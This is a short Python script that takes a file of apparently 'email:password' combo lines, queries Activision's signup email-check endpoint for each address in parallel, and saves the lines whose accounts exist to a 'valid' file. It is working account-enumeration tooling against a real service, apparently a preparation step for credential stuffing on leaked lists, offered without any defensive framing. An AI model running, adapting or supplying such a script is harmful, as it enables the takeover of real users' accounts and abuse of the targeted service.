import requests
import os
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

def check_email(line, url):
    full_line = line.strip()
    if full_line == '':
        return None

    splited_full_line = full_line.split(':')
    username = splited_full_line[0]

    params = {
        'email': username
    }

    response = requests.post(url, params=params)
    if response.status_code != 200:
        print('failed, to check email, username: %s' % username)
        return None
    else:
        json_response = response.json()
        if json_response['status'] == 'valid':
            return full_line
        else:
            return None

def main():
    all_emails_file = open(os.path.dirname(os.path.realpath(__file__)) + '/all_emails.txt', 'r')
    valid_emails_file = open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'a')
    num_lines = 300000 #sum(1 for _ in all_emails_file)
    all_emails_file.seek(0)
    url = 'https://s.activision.com/activision/signup/checkEmail'

    num_valids = 0

    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = []
        for i in tqdm(range(num_lines), desc="Checking emails…", ascii=False, ncols=100):
            line = all_emails_file.readline()
            future = executor.submit(check_email, line, url)
            futures.append(future)

        for future in tqdm(futures, desc="Writing valid emails…", ascii=False, ncols=100):
            result = future.result()
            if result:
                valid_emails_file.write(result + '\n')

    all_emails_file.close()
    valid_emails_file.close()

if __name__ == '__main__':
    main()
